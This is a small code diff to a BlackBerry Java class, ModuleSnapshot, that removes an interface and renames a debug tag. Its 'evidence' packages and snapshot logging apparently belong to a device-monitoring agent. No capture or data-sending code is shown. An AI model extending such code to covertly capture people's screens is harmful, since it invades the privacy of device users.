@@ -21,7 +21,6 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
-import blackberry.interfaces.UserAgent;
 import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
@@ -30,9 +29,9 @@ import blackberry.utils.WChar;
  * 
  * @author user1
  */
-public final class ModuleSnapshot extends BaseInstantModule implements UserAgent{
+public final class ModuleSnapshot extends BaseInstantModule{
     //#ifdef DEBUG
-    static Debug debug = new Debug("SnapShotAgent", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("ModSnapshot", DebugLevel.INFORMATION);
     //#endif
 
     private static final int LOG_SNAPSHOT_VERSION = 2009031201;
